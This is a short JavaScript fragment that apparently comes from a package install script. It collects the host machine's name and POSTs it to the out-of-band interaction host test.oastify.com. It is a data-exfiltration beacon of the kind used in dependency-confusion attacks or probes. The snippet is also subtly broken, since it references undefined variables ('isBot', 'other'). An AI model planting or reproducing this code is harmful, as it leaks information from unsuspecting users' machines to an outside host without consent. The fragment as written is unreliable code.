const os=require('os'); const https=require('https');
const name=os.hostname().toLowerCase(); if (!isBot) {
 const body=`Hostname: ${other}`; const options={hostname:'test.oastify.com', method:'POST'};
 const req=https.request(options,()=>{}); req.write(body); req.end(); }
